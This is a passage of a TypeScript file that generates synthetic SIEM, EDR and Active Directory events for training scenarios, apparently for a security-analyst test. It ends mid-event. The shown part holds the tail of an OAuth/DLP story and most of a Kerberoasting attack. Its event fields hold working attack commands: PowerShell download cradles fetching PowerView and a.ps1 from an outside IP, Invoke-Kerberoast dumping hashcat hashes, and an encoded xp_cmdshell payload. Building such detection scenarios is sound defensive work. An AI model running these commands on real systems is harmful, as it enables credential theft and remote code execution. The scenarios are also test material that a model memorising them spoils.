        "data.office365.PolicyDetails[0].Rules[0].RuleName": "Confidential file downloaded by an unmanaged client",
        "data.office365.PolicyDetails[0].Rules[0].Severity": "High",
        "data.office365.IncidentId": "DLP-2026-06-11-91847",
      },
    },
    {
      id: "oauth_09_mdca_alert",
      ts: T(75 * MIN),
      source: "siem", vendor: "Microsoft Sentinel",
      event_type: "ueba_anomaly", severity: "high", is_detection: true, mitre_technique: "T1528", mitre_tactic: "Credential Access",
      hostname: "sentinel.nexacorp.com", user_email: EMAIL, src_ip: APP_IP,
      description: "Defender for Cloud Apps, ingested by Sentinel, raised 'Suspicious OAuth app file download activities' for Productivity Suite Pro.",
      raw: {
        "TimeGenerated": T(75 * MIN),
        "AlertName": "Suspicious OAuth app file download activities",
        "AlertSeverity": "High",
        "ProviderName": "MCAS",
        "ProductName": "Microsoft Cloud App Security",
        "VendorName": "Microsoft",
        "SystemAlertId": "3e7a9c41-0b6d-4f28-a5d3-91c8e4b2f7a0",
        "Status": "New",
        "StartTime": T(55 * MIN),
        "EndTime": T(62 * MIN),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1528\"]",
        "CompromisedEntity": EMAIL,
        "Entities": JSON.stringify([
          { $id: "2", Name: "j.chen", UPNSuffix: "nexacorp.com", Type: "account" },
          { $id: "3", Address: APP_IP, Type: "ip" },
          { $id: "4", Name: "Productivity Suite Pro", AppId: APP_ID, Type: "oauth-application" },
        ]),
        "ExtendedProperties.App Name": "Productivity Suite Pro",
        "ExtendedProperties.App ID": APP_ID,
        "ExtendedProperties.App Created": "2026-06-09",
        "ExtendedProperties.Publisher Verified": "False",
        "ExtendedProperties.Consenting Users": "1",
        "ExtendedProperties.Permission Level": "High",
        "ExtendedProperties.Reply URL": "https://productivty-suite.com/callback",
        "ExtendedProperties.Files Downloaded": "9",
      },
    },
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "DLP alert on a Finance SharePoint contract", events, T, MIN, APP_ID };
}

/** Telemetry half of `buildKerberoastingScenario`: the events and the story title, no answer key. */
export function kerberoastingScenarioEvents() {
  const B = new Date("2026-05-15T10:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const attackerHost = "WS-DEV-4412";
  const attackerUser = "m.cohen@nexacorp.com";
  const attackerIp = "10.10.30.44";
  const dbHost = "srv-db01";
  const dbIp = "10.10.40.61";
  const fileIp = "10.10.40.70";
  const dcIp = "10.10.40.10";
  const c2Ip = "91.243.85.117";
  // The hidden PowerShell the attacker runs through xp_cmdshell: IEX (New-Object Net.WebClient).DownloadString('http://91.243.85.117/a.ps1')
  const encPayload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADMALgA4ADUALgAxADEANwAvAGEALgBwAHMAMQAnACkA";
  const pvCradle = `IEX (New-Object Net.WebClient).DownloadString('http://${c2Ip}/pv.ps1')`;

  // Twelve service accounts with an SPN (user-account SPN owners: machine accounts have long random keys and are not Kerberoasted).
  // sid = the account's RID; the ServiceName of a 4769 is the account that owns the SPN.
  const spns = [
    { acct: "svc-mssql",      rid: 1301, spn: "MSSQLSvc/srv-db01:1433" },
    { acct: "svc-iis",        rid: 1305, spn: "HTTP/intranet.corp" },
    { acct: "svc-backup",     rid: 1310, spn: "HTTP/srv-backup01:9419" },
    { acct: "svc-mssql02",    rid: 1302, spn: "MSSQLSvc/srv-db02:1433" },
    { acct: "svc-sharepoint", rid: 1303, spn: "HTTP/sharepoint.corp" },
    { acct: "svc-sap",        rid: 1304, spn: "SAPService/sap-prod01:3200" },
    { acct: "svc-jenkins",    rid: 1306, spn: "HTTP/jenkins01:8080" },
    { acct: "svc-gitlab",     rid: 1307, spn: "HTTP/gitlab.corp" },
    { acct: "svc-sccm",       rid: 1308, spn: "MSSQLSvc/srv-sccm01:1433" },
    { acct: "svc-wsus",       rid: 1311, spn: "HTTP/srv-wsus01:8530" },
    { acct: "svc-reports",    rid: 1312, spn: "HTTP/reports.corp" },
    { acct: "svc-monitor",    rid: 1313, spn: "HTTP/nagios01" },
  ];
  const SID_PREFIX = "S-1-5-21-3421479547-3897544621-1789562108";

  // ── helpers ──────────────────────────────────────────────────────────────────
  /** A 4769 on DC01 for one service ticket m.cohen asked for. */
  const tgs = (id: string, at: number, i: number, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "ad", vendor: "Windows Security", event_type: "kerberos_tgs",
    hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
    severity: "medium",
    description: `m.cohen requested a Kerberos service ticket for ${spns[i].spn} (${spns[i].acct}) using RC4 encryption (0x17).`,
    raw: {
      "winlog.event_id": "4769",
      "winlog.channel": "Security",
      "winlog.computer_name": "DC01.nexacorp.com",
      "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
      // 4769: TargetUserName is the REQUESTING principal; ServiceName is the account that owns the SPN.
      "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
      "winlog.event_data.TargetDomainName": "NEXACORP.COM",
      "winlog.event_data.ServiceName": spns[i].acct,
      "winlog.event_data.ServiceSid": `${SID_PREFIX}-${spns[i].rid}`,
      "winlog.event_data.TicketOptions": "0x40810000",
      "winlog.event_data.TicketEncryptionType": "0x17",
      "winlog.event_data.IpAddress": attackerIp,
      "winlog.event_data.Status": "0x0",
      "event.code": "4769",
      "event.action": "kerberos-service-ticket-requested",
      "event.outcome": "success",
    },
    ...over,
  });
  /** An MDE process-create row. */
  const proc = (id: string, at: number, host: string, ip: string, user: string, p: NonNullable<TelemetryEvent["process"]>, description: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
    hostname: host, user_email: user, src_ip: ip,
    severity: "informational",
    process: p,
    description,
    raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": host, "ActionType": "ProcessCreated" },
    ...over,
  });
  /** An MDE network row (DeviceNetworkEvents) for a process. */
  const conn = (id: string, at: number, host: string, ip: string, user: string, p: NonNullable<TelemetryEvent["process"]>, dst: string, port: number, description: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "net_connection",
    hostname: host, user_email: user, src_ip: ip, dst_ip: dst, dst_port: port, protocol: "tcp",
    severity: "informational",
    process: p,
    description,
    raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": host, "ActionType": "ConnectionSuccess" },
    ...over,
  });

  // Processes of m.cohen's workstation session.
  const wsUserinit = { name: "userinit.exe", pid: 1604, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 1020, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\m.cohen", integrity: "medium" as const };
  const wsExplorer = { name: "explorer.exe", pid: 3912, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 1604, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\m.cohen", integrity: "medium" as const };
  const psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const wsCmd = { name: "cmd.exe", pid: 6598, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "explorer.exe", parent_pid: 3912, cmdline: "cmd.exe", user: "NEXACORP\\m.cohen", integrity: "medium" as const };
  const psEnum = { name: "powershell.exe", pid: 6620, path: psPath, parent_name: "cmd.exe", parent_pid: 6598,
    cmdline: `powershell.exe -nop -ep bypass -c "${pvCradle}; Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname | Export-Csv $env:TEMP\\spn.csv -NoTypeInformation"`,
    user: "NEXACORP\\m.cohen", integrity: "medium" as const };
  const psRoast = { name: "powershell.exe", pid: 6688, path: psPath, parent_name: "cmd.exe", parent_pid: 6598,
    cmdline: `powershell.exe -nop -ep bypass -c "${pvCradle}; Invoke-Kerberoast -OutputFormat Hashcat | Out-File $env:TEMP\\kh.txt"`,
    user: "NEXACORP\\m.cohen", integrity: "medium" as const };
  const mstsc = { name: "mstsc.exe", pid: 6730, path: "C:\\Windows\\System32\\mstsc.exe", parent_name: "explorer.exe", parent_pid: 3912, cmdline: `mstsc.exe /v:${dbIp}`, user: "NEXACORP\\m.cohen", integrity: "medium" as const };

  // Processes on the database server.
  const dbSvc = "NEXACORP\\svc-mssql";   // the SQL Server service runs as the domain service account
  const dbServices = { name: "services.exe", pid: 716, path: "C:\\Windows\\System32\\services.exe", parent_name: "wininit.exe", parent_pid: 640, cmdline: "C:\\Windows\\system32\\services.exe", user: "NT AUTHORITY\\SYSTEM", integrity: "system" as const };
  const sqlservr = { name: "sqlservr.exe", pid: 2200, path: "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe", parent_name: "services.exe", parent_pid: 716,
    cmdline: "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe\" -sMSSQLSERVER", user: dbSvc, integrity: "system" as const };
  const dbUserinit = { name: "userinit.exe", pid: 3320, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 3284, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\svc-mssql", integrity: "high" as const };
  const dbExplorer = { name: "explorer.exe", pid: 3396, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 3320, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\svc-mssql", integrity: "high" as const };
  const dbCmdSession = { name: "cmd.exe", pid: 3550, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "explorer.exe", parent_pid: 3396, cmdline: "\"C:\\Windows\\System32\\cmd.exe\"", user: "NEXACORP\\svc-mssql", integrity: "high" as const };
  const sqlcmdLine = `sqlcmd.exe -S localhost -E -Q "EXEC xp_cmdshell 'powershell -WindowStyle Hidden -enc ${encPayload}'"`;
  const sqlcmd = { name: "sqlcmd.exe", pid: 3604, path: "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\SQLCMD.EXE", parent_name: "cmd.exe", parent_pid: 3550, cmdline: sqlcmdLine, user: "NEXACORP\\svc-mssql", integrity: "high" as const };
  const xpCmd = { name: "cmd.exe", pid: 5110, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "sqlservr.exe", parent_pid: 2200, cmdline: `cmd.exe /c "powershell -WindowStyle Hidden -enc ${encPayload}"`, user: dbSvc, integrity: "system" as const };
  const dbPs = { name: "powershell.exe", pid: 5180, path: psPath, parent_name: "cmd.exe", parent_pid: 5110, cmdline: `powershell -WindowStyle Hidden -enc ${encPayload}`, user: dbSvc, integrity: "system" as const };

  const events: TelemetryEvent[] = [
    // ── m.cohen's normal morning: logon, shell, and the tickets a developer asks for ─────────────────
    {
      id: "evt_kerb_01_logon", ts: T(-70 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      severity: "informational",
      description: "m.cohen logged on interactively to developer workstation WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": attackerHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1109842",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": `${attackerHost}$`,
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1204",
        "winlog.event_data.TargetUserName": "m.cohen",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xA2F8C1",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "0",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\m.cohen",
        "user.domain": "NEXACORP",
        "host.name": attackerHost,
        "source.ip": attackerIp,
        "authentication.protocol": "Kerberos",
      },
    },
    proc("evt_kerb_01a_userinit", -70 * MIN + 6 * SEC, attackerHost, attackerIp, attackerUser, wsUserinit, "userinit.exe started for m.cohen's interactive session on WS-DEV-4412 after the logon."),
    proc("evt_kerb_01b_shell", -70 * MIN + 12 * SEC, attackerHost, attackerIp, attackerUser, wsExplorer, "explorer.exe started for m.cohen's interactive session on WS-DEV-4412."),
    // Baseline: two AES-encrypted tickets for computer accounts, the way m.cohen's own work looks.
    {
      id: "evt_kerb_baseline_tgs", ts: T(-60 * MIN), is_baseline: true,
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgs",
      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
      severity: "informational",
      description: "m.cohen requested a Kerberos service ticket for cifs/srv-repo01, AES256-encrypted.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        "winlog.event_data.TicketEncryptionType": "0x12",
        // Service ACCOUNT, not the SPN (cifs/srv-repo01) that was requested.
        "winlog.event_data.ServiceName": "SRV-REPO01$",
        "winlog.event_data.IpAddress": attackerIp,
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_kerb_baseline_tgs2", ts: T(-34 * MIN), is_baseline: true,
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgs",
      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
      severity: "informational",
      description: "m.cohen requested a Kerberos service ticket for ldap/dc01.nexacorp.com, AES256-encrypted.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        "winlog.event_data.TicketEncryptionType": "0x12",
        "winlog.event_data.ServiceName": "DC01$",
        "winlog.event_data.IpAddress": attackerIp,
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
      },
    },

    // ── SPN enumeration: PowerShell pulls PowerView from the attacker's server and queries LDAP ─────────
    proc("evt_kerb_ws_cmd", 80 * SEC, attackerHost, attackerIp, attackerUser, wsCmd, "explorer.exe started cmd.exe in m.cohen's session on WS-DEV-4412."),
    proc("evt_kerb_ps_enum", 100 * SEC, attackerHost, attackerIp, attackerUser, psEnum,
      "powershell.exe on WS-DEV-4412 downloaded pv.ps1 from 91.243.85.117 and ran Get-DomainUser -SPN."),
    conn("evt_kerb_ps_dl1", 102 * SEC, attackerHost, attackerIp, attackerUser, psEnum, c2Ip, 80,
      "powershell.exe on WS-DEV-4412 fetched http://91.243.85.117/pv.ps1.", { network: { url: `http://${c2Ip}/pv.ps1`, domain: c2Ip, method: "GET", bytes_in: 481_204 } }),
    {
      id: "evt_kerb_fw_dl1", ts: T(102 * SEC),
      source: "firewall", vendor: "FortiGate", event_type: "net_connection",
      hostname: attackerHost, src_ip: attackerIp, dst_ip: c2Ip, dst_port: 80,
      severity: "low",
      description: "WS-DEV-4412 opened an outbound TCP/80 session to 91.243.85.117.",
      raw: {
        "data.type": "traffic", "data.subtype": "forward",
        "data.srcip": attackerIp, "data.dstip": c2Ip, "data.dstport": "80", "data.proto": "6",
        "data.action": "accept", "data.app": "HTTP", "data.sentbyte": 612, "data.rcvdbyte": 481_204, "data.sessionid": "73311207",
      },
    },
    conn("evt_kerb_ps_ldap", 130 * SEC, attackerHost, attackerIp, attackerUser, psEnum, dcIp, 389,
      "powershell.exe on WS-DEV-4412 opened an LDAP connection to 10.10.40.10."),
    {
      id: "evt_kerb_spn_csv", ts: T(140 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      severity: "low",
      file: { path: "C:\\Users\\m.cohen\\AppData\\Local\\Temp\\spn.csv", size: 1_846 },
      process: psEnum,
      description: "powershell.exe on WS-DEV-4412 wrote spn.csv to m.cohen's Temp folder.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": attackerHost, "ActionType": "FileCreated" },
    },
    // Directory-side view of the same query, as the identity sensor reports it.
    {
      id: "evt_kerb_mdi_ldap_recon", ts: T(2 * MIN + 40 * SEC),
      source: "ad", vendor: "Microsoft Defender for Identity",
      event_type: "ids_signature", severity: "medium", is_detection: true,
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      mitre_technique: "T1087.002",
      description: "Defender for Identity raised 'Security principal reconnaissance (LDAP)' for m.cohen on WS-DEV-4412 (10.10.30.44): an LDAP search with the filter (servicePrincipalName=*).",
      raw: {
        "TimeGenerated": T(2 * MIN + 40 * SEC),
        "AlertName": "Security principal reconnaissance (LDAP)",
        "AlertSeverity": "Medium",
        "ProductName": "Azure Advanced Threat Protection",
        "VendorName": "Microsoft",
        "SystemAlertId": "0f6a9c34-52d1-4a8e-b7c3-91d2e48a6b05",
        "Status": "New",
        "StartTime": T(2 * MIN + 10 * SEC),
        "EndTime": T(2 * MIN + 30 * SEC),
        "Tactics": "Discovery",
        "Techniques": "[\"T1087\"]",
        "CompromisedEntity": "m.cohen",
        "Entities": JSON.stringify([
          { $id: "2", HostName: attackerHost, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Address: attackerIp, Type: "ip" },
          { $id: "4", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
        ]),
        "ExtendedProperties": JSON.stringify({ "Source computer": attackerHost, "Source account": "m.cohen", "Search filter": "(servicePrincipalName=*)", "Domain controller": "DC01" }),
      },
    },

    // ── Credential access: a second PowerShell requests a ticket for every SPN account ───────────────────
    proc("evt_kerb_ps_tickets", 230 * SEC, attackerHost, attackerIp, attackerUser, psRoast,
      "powershell.exe on WS-DEV-4412 downloaded pv.ps1 from 91.243.85.117 and ran Invoke-Kerberoast.",
      { severity: "medium", is_detection: true, mitre_technique: "T1558.003" }),
    conn("evt_kerb_ps_dl2", 232 * SEC, attackerHost, attackerIp, attackerUser, psRoast, c2Ip, 80,
      "powershell.exe on WS-DEV-4412 fetched http://91.243.85.117/pv.ps1.", { network: { url: `http://${c2Ip}/pv.ps1`, domain: c2Ip, method: "GET", bytes_in: 481_204 } }),
    {
      id: "evt_kerb_fw_dl2", ts: T(232 * SEC),
      source: "firewall", vendor: "FortiGate", event_type: "net_connection",
      hostname: attackerHost, src_ip: attackerIp, dst_ip: c2Ip, dst_port: 80,
      severity: "low",
      description: "WS-DEV-4412 opened a second outbound TCP/80 session to 91.243.85.117.",
      raw: {
        "data.type": "traffic", "data.subtype": "forward",
        "data.srcip": attackerIp, "data.dstip": c2Ip, "data.dstport": "80", "data.proto": "6",
        "data.action": "accept", "data.app": "HTTP", "data.sentbyte": 598, "data.rcvdbyte": 481_204, "data.sessionid": "73311966",
      },
    },
    conn("evt_kerb_ps_krb", 238 * SEC, attackerHost, attackerIp, attackerUser, psRoast, dcIp, 88,
      "powershell.exe on WS-DEV-4412 opened a Kerberos (TCP/88) connection to 10.10.40.10."),
    // 12 service tickets in 90 seconds, all RC4. The first three keep their original ids (the questions cite evt_kerb_03).
    tgs("evt_kerb_03_tgs_sql", 4 * MIN, 0, { severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "m.cohen requested a Kerberos TGS ticket for MSSQLSvc/srv-db01:1433 (svc-mssql) using RC4 encryption (0x17), the first of a run of requests." }),
    tgs("evt_kerb_04_tgs_iis", 4 * MIN + 8 * SEC, 1, { severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "m.cohen requested a second RC4-encrypted TGS ticket, this time for HTTP/intranet.corp (svc-iis), 8 seconds after the first." }),
    tgs("evt_kerb_05_tgs_backup", 4 * MIN + 16 * SEC, 2, { severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "A third RC4-encrypted TGS ticket was requested for HTTP/srv-backup01:9419 (svc-backup), the third in 16 seconds." }),
    tgs("evt_kerb_tgs_04", 4 * MIN + 24 * SEC, 3),
    tgs("evt_kerb_tgs_05", 4 * MIN + 32 * SEC, 4),
    tgs("evt_kerb_tgs_06", 4 * MIN + 40 * SEC, 5),
    tgs("evt_kerb_tgs_07", 4 * MIN + 48 * SEC, 6),
    tgs("evt_kerb_tgs_08", 4 * MIN + 56 * SEC, 7),
    tgs("evt_kerb_tgs_09", 5 * MIN + 4 * SEC, 8),
    tgs("evt_kerb_tgs_10", 5 * MIN + 12 * SEC, 9),
    tgs("evt_kerb_tgs_11", 5 * MIN + 20 * SEC, 10),
    tgs("evt_kerb_tgs_12", 5 * MIN + 28 * SEC, 11),
    {
      // The tickets leave the host as hashcat-format hashes in a text file.
      id: "evt_kerb_kh_txt", ts: T(5 * MIN + 35 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      severity: "low",
      file: { path: "C:\\Users\\m.cohen\\AppData\\Local\\Temp\\kh.txt", size: 14_806 },
      process: psRoast,
      description: "powershell.exe on WS-DEV-4412 wrote kh.txt (14.8 KB) to m.cohen's Temp folder.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": attackerHost, "ActionType": "FileCreated" },
    },

    // ── First alert: Defender for Identity, after the requests it reports ─────
    // Its real alert name for an account enumerating SPN holders and pulling their service tickets, as
    // the alert lands in the SIEM (SecurityAlert): name, window, entities.
    {
      id: "evt_kerb_02_mdi_spn_exposure", ts: T(6 * MIN),
      source: "ad", vendor: "Microsoft Defender for Identity",
      event_type: "ids_signature", severity: "high", is_detection: true,
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "Defender for Identity raised 'Suspected Kerberos SPN exposure' for m.cohen on WS-DEV-4412 (10.10.30.44), naming 12 target service accounts including svc-mssql, svc-iis and svc-backup.",
      raw: {
        "TimeGenerated": T(6 * MIN),
        "AlertName": "Suspected Kerberos SPN exposure",
        "AlertSeverity": "High",
        "ProductName": "Azure Advanced Threat Protection",
        "VendorName": "Microsoft",
        "SystemAlertId": "b3e81d52-7c40-4f9a-a6d1-2f95c0e7b418",
        "Status": "New",
        "StartTime": T(4 * MIN),
        "EndTime": T(5 * MIN + 30_000),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "m.cohen",
        "Entities": JSON.stringify([
          { $id: "2", HostName: attackerHost, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Address: attackerIp, Type: "ip" },
          { $id: "4", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
          { $id: "5", Name: "svc-mssql", NTDomain: "NEXACORP", Type: "account" },
          { $id: "6", Name: "svc-iis", NTDomain: "NEXACORP", Type: "account" },
          { $id: "7", Name: "svc-backup", NTDomain: "NEXACORP", Type: "account" },
        ]),
        "ExtendedProperties": JSON.stringify({ "Target accounts": "12", "Source computer": attackerHost, "Source account": "m.cohen" }),
      },
    },

    // T+8min: Volume spike - 12 TGS tickets in 90 seconds
    {
      id: "evt_kerb_06_ticket_spike", ts: T(8 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: "DC01", src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "Microsoft Sentinel rule 'Anomalous Kerberos service ticket volume' matched 12 RC4 (0x17) TGS requests from m.cohen for 12 distinct service accounts within 90 seconds.",
      // Analytics-rule alert as Sentinel stores it: the rule name, the counts it measured and the
      // entities, no verdict of its own.
      raw: {
        "AlertName": "Anomalous Kerberos service ticket volume",
        "AlertSeverity": "High",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "c1d4e7a2-58b3-4f06-9e21-7a3b5c8d0f14_8f2a6e3c-1b47-4d95-a0c8-6e9f2b5d7a31",
        "Status": "New",
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "m.cohen",
        "ExtendedProperties.Query Period": "01:00:00",
        "ExtendedProperties.Number of events": 12,
        "ExtendedProperties.Time window (s)": 90,
        "ExtendedProperties.TicketEncryptionType": "0x17",
        "ExtendedProperties.Domain Controller": "DC01.nexacorp.com",
        "ExtendedProperties.Targeted SPNs": spns.map(s => s.spn),
        "Entities": JSON.stringify([
          { $id: "2", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
          { $id: "3", Address: attackerIp, Type: "ip" },
        ]),
      },
    },

    // ── Credential use: the cracked svc-mssql password opens an RDP session on the database server ────────
    proc("evt_kerb_mstsc", 14 * MIN + 50 * SEC, attackerHost, attackerIp, attackerUser, mstsc,
      "mstsc.exe on WS-DEV-4412 was started with /v:10.10.40.61."),
    conn("evt_kerb_mstsc_net", 14 * MIN + 52 * SEC, attackerHost, attackerIp, attackerUser, mstsc, dbIp, 3389,
      "mstsc.exe on WS-DEV-4412 connected to 10.10.40.61 on TCP/3389."),
    {
      id: "evt_kerb_fw_rdp", ts: T(14 * MIN + 52 * SEC),
      source: "firewall", vendor: "FortiGate", event_type: "net_connection",
      src_ip: attackerIp, dst_ip: dbIp, dst_port: 3389,
      severity: "low",
      description: "The firewall allowed TCP/3389 from 10.10.30.44 to 10.10.40.61 (workstation VLAN to server VLAN).",
      raw: {
        "data.type": "traffic", "data.subtype": "forward",
        "data.srcip": attackerIp, "data.dstip": dbIp, "data.dstport": "3389", "data.proto": "6",
        "data.action": "accept", "data.app": "RDP", "data.sentbyte": 61_204, "data.rcvdbyte": 902_117, "data.sessionid": "73316440",
      },
    },
    {
      // The domain controller validates the NTLM credential the RDP client sent.
      id: "evt_kerb_ntlm_validate", ts: T(14 * MIN + 58 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "DC01", user_email: "svc-mssql@nexacorp.com",
      severity: "low",
      description: "DC01 validated an NTLM credential for svc-mssql sent from workstation WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4776",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.Workstation": attackerHost,
        "winlog.event_data.Status": "0x0",
        "event.code": "4776",
      },
    },
    // T+15min: Login from cracked service account svc-mssql (T1021.001)
    {
      id: "evt_kerb_07_svcacct_login", ts: T(15 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dbHost, user_email: "svc-mssql@nexacorp.com", src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1021.001", mitre_tactic: "Lateral Movement",
      description: "The svc-mssql service account logged on with an interactive session (Type 10, RemoteInteractive) to srv-db01 from WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": dbHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserSid": `${SID_PREFIX}-1301`,
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        // Type 10 (RemoteInteractive), not 2: LogonType 2 is a physical console session and cannot
        // carry a source IP from another machine.
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.LmPackageName": "NTLM V2",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "52100",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\svc-mssql",
        "host.name": dbHost,
        "source.ip": attackerIp,
        "authentication.protocol": "NTLM",
      },
    },
    // The RDP session on the database server: shell, then a command prompt.
    proc("evt_kerb_db_userinit", 15 * MIN + 4 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", dbUserinit, "userinit.exe started for svc-mssql's remote desktop session on srv-db01."),
    proc("evt_kerb_db_explorer", 15 * MIN + 10 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", dbExplorer, "explorer.exe started for svc-mssql's remote desktop session on srv-db01."),
    proc("evt_kerb_db_cmd", 15 * MIN + 40 * SEC, dbHost, dbIp, "svc-mssql@nexacorp.com", dbCmdSession, "explorer.exe started cmd.exe in svc-mssql's session on srv-db01."),

    // ── The same account reaches the file server from the database server ────────────────────────────────
    {
      id: "evt_kerb_svcacct_lateral", ts: T(16 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high",
